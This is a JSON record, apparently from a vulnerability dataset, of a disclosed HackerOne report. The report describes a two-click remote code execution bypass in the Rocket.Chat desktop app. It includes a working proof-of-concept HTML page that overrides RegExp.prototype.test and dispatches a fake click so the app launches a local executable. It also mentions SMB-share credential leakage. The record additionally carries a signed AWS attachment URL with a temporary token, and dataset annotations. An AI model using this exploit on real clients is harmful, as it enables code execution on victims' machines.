@@ -1,0 +1,44 @@
+{
+    "reported_to": "Rocket.Chat",
+    "reported_by": "ivarsvids ",
+    "title": "Desktop app RCE (#276031 bypass)",
+    "content": "\nSummary: #276031 fix bypass, two click remote code execution.\nDescription: The security issue is in links preload file https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/preload/links.js file.\nBy rewriting RegExp.prototype.test method it is possible to prepare proper answers to get to the shell.openExternal method. To trigger events attached by addEventListener you can use dispatchEvent method.\nNote: for demo I pointed to calc.exe, it also cloud be pointed, to SMB share (example. \\\\server\\share\\executable.exe), which can lead to windows credential leak and attacker also can execute arbitrary code on victims machine.\ni believe this issue is cross-platform, an can be exploited in Linux, MacOS with minor JavaScript modifications.\nReleases Affected:\nRocket.Chat.Electron 2.17.9\nSteps To Reproduce (from initial installation to vulnerability):\nCreate web page with following index.html\nCode 769 Bytes\n1<html>\n2\t<head>\n3\t</head>\n4\t<body style=\"background-color: white;\" >\n5\t\t<h1>Initializing surprise in 3, 2, 1</h1>\n6\t\t<script>\n7\t\t\tsetTimeout(() => {\n8\t\t\t\t// create link\n9\t\t\t\tlet a = document.createElement('A');\n10\t\t\t\ta.setAttribute('href', 'c:\\\\windows\\\\system32\\\\calc.exe');\n11\n12\t\t\t\t// hooks regexp.test\n13\t\t\t\tRegExp.prototype._test = RegExp.prototype._test || RegExp.prototype.test;\n14\t\t\t\tRegExp.prototype.test = function(...args){\n15\t\t\t\t\treturn this.source === '^([a-z]+:)?\\\\/\\\\/' || this._test(...args);\n16\t\t\t\t}\n17\t\t\t\t\n18\t\t\t\t// add missing method\n19\t\t\t\tdocument.closest = () => a;\n20\n21\t\t\t\t// triger event\n22\t\t\t\tdocument.dispatchEvent(new Event('click'));\n23\n24\t\t\t\t//cleanup\n25\t\t\t\tRegExp.prototype.test = RegExp.prototype._test;\n26\t\t\t\tdelete RegExp.prototype._test;\n27\t\t\t}, 100);\n28\t\t</script>\n29\t</body>\n30</html>\ncreate api/info which contains JSON, can be empty JSON.\nAdd new server\nSupporting Material/References:\n<image_0>\nSuggested mitigation\nI understand that deep-links and Add new server are a features and not bugs\nThe simplest fix would be to check isTrusted attribute for events, but I'm 100% certain that it can be bypassed.\nEnable context isolation (https://github.com/electron/electron/blob/master/docs/tutorial/security.md#3-enable-context-isolation-for-remote-content)\nImpact\nAn attacker can trick victim to click on deep-link or add self hosted server to desktop application, which leads to remote code execution. I understand that deep-links and/or self hosted servers are not a bug, but it can be used in attack vector.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Code Injection"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/suwfPfXGLzFKXE5RhPgqnY9n?response-content-disposition=attachment%3B%20filename%3D%22rocket_rce.gif%22%3B%20filename%2A%3DUTF-8%27%27rocket_rce.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7ZJYMYW5%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T222444Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHEtprC56zaUG2%2FRQnJQU1AahNVwinnmCjz0AMvEoLsJAiAtalDhcF3yKdYS%2Bb1p8vvhihOuEKKMZPrP9cZEXC3ZpSqyBQgeEAMaDDAxMzYxOTI3NDg0OSIMOxvIuAztr0KG0YJwKo8F99h1YUQQcm2FE6WzHuEqtut56cvYoqSEi3cDXPxVrNiau8f2FYc%2BGVh2pPFTLKTWq%2Fj9iBMNwaq2umeN3jG1S2EV67bK2tEUv%2BTtWtrCMzQI53hrD9RZSJ54R%2BwxqyV%2FsD0VCEQfjCmxonnWej7%2BD6VYaVi0YZOJAwNX5PAcDSg99s7wgPnrGHkfizmBvpvc0J6tZmQMe0FO%2FsO%2FOr4b8WMTLITP93YwuKfT8lIKhx9QlLUnDmgzanjtBG%2BOwDOBlVrGLQUA717L6fPSpfPVellRn3oOtlutzwdgJ3SJK%2BFtx4zKRPhyPI4wfo0MPaf2QDDVlK1NIvP3f1KildXYEtiPXyAGlwqMxm8tox397UvQqriUNCUY%2BQT0cuvxiJNx7qawK%2FhWr52PoDZBnHEgOMp%2F0So6e2ZK77%2BsfVHx%2FL1naxQZjbNE%2BJB35ADm9FSxGnat5OW1Ji715LXd3xB4zrbga5cIckAfHehUkFQkbqKPjib7swUSMa3J3HnO2gyFgpagMJT8GNc4yYUVc8p8lpZb%2BlvjPd4O98aeVtKDOdmJ2YuiA%2B9qcHVy7rh6iNwYYeLneIenOFNG%2FiQi1fgJNxEop5QW3r7U08KWWhYbzQgsZyzOwHg41m9r2iYmU%2Fave%2BiPmpK3t5Qyhm1c9qPxo4M%2FH2HWhAgQMUlkwWrmd8jcIbK%2F9qsRlmwnXi9a1yi7msI2PoFIai04bTpQB3s5yMjxumH5hJ6oBlTDHVqMMRonaHWlH3XBEWizIg1Tl4cBCnRg3yC76ayBTft2vb3xYqWKTZ5d11UZYCSD5W%2Ftw2XvkwcHAlN6ei6bKxPx9rAIjGd6R4%2Fe1FpV4o8r3JkutsNv7D4qGeUZPnsgCO6gnjC%2BtYy%2FBjqyASN16RTKYay%2FwLUU9mPD2YYiV%2F6FCO4IfRUuBmbxOTqOFynX7rTVbCya622jgE8c%2FnRr5QSvkGhqZbU8DxKHWqNL9YFhm8Z2ygZhdwZ9jrOnc0xajDHRFlniTLW%2FMiEvLUOcXkj7rjkUl4ialh%2B0vmGphL66I%2FiMHlbx9laqjEldVMubzZPVSeBzvOd8z5FzQGxL61EakDASTVnd5UzDSzq2YfpItACnyq6a899PD1rYcWY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18099af059cb2c5ca6e73b1d774cd4a6e1f1672c83319b1b64f9a0452e2d1132"
+    },
+    "disclosed_date": 1604578860,
+    "report_url": "https://hackerone.com/reports/843171",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Create a web page with the provided HTML code that includes a malicious script to rewrite RegExp.prototype.test and trigger a click event."
+        ],
+        [
+            2,
+            "Host the web page and ensure the victim interacts with it, causing the Rocket.Chat desktop app to execute arbitrary code via shell.openExternal."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows remote code execution in the Rocket.Chat desktop app by bypassing a previous fix (#276031) through manipulation of the RegExp.prototype.test method. This enables an attacker to execute arbitrary code on the victim's machine by tricking them into clicking a malicious link or adding a self-hosted server.",
+    "reason": "The attack involves understanding and manipulating JavaScript's RegExp prototype, triggering events programmatically, and exploiting the application's handling of external links. While the components are somewhat complex, the manipulation of RegExp is a known technique in JavaScript exploitation.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "276031",
+    "authnz_metadata": {
+        "reason": "The vulnerability involves manipulating the RegExp.prototype.test method and triggering events in the desktop application's preload script, which is outside the scope of typical web-based authN/authZ testing methodologies. The attack vector relies on client-side JavaScript manipulation and Electron-specific behavior, not server-side authorization checks or session handling.",
+        "is_detectable": false
+    }
+}
